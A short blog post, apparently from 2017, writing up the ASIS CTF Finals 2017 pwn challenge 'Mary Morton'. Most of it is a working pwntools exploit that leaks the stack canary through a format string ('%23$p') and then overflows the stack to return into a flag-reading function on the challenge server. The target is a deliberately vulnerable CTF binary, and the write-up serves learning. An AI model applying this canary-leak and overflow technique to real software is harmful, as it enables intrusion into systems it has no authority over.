---
layout: post
alias: "/blog/2017/09/11/asis-ctf-finals-2017-mary-morton/"
date: "2017-09-11T08:09:08+09:00"
tags: [ "ctf", "writeup", "pwn", "asis-ctf" ]
---

# ASIS CTF Finals 2017: Mary Morton

他の問題が解けないのでプロが放置してたやるだけをやってお茶を濁した回。

## problem

```
$ nc 146.185.132.36 19153
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 

```

## solution

Read the canary with `2. Format String Bug`, then use `1. Stack Bufferoverflow Bug` to jump the function which calls `system("/bin/cat ./flag");`.

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='146.185.132.36')
parser.add_argument('port', nargs='?', default=19153, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='./mary_morton')
args = parser.parse_args()
context.log_level = args.log_level
context.binary = args.binary
elf = ELF(args.binary)

system_cat_flag = 0x4008da
p = remote(args.host, args.port)

menu = '''\
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
'''

# Format String Bug
p.sendlineafter(menu, '2')
p.sendline('%23$p')
canary = int(p.recvline(), 16)

# Stack Bufferoverflow Bug
payload = ''
payload += 'A' * 0x88
payload += p64(canary)
payload += 'B' * 8
payload += p64(system_cat_flag)
p.sendlineafter(menu, '1')
p.sendline(payload)

p.recvall()
```
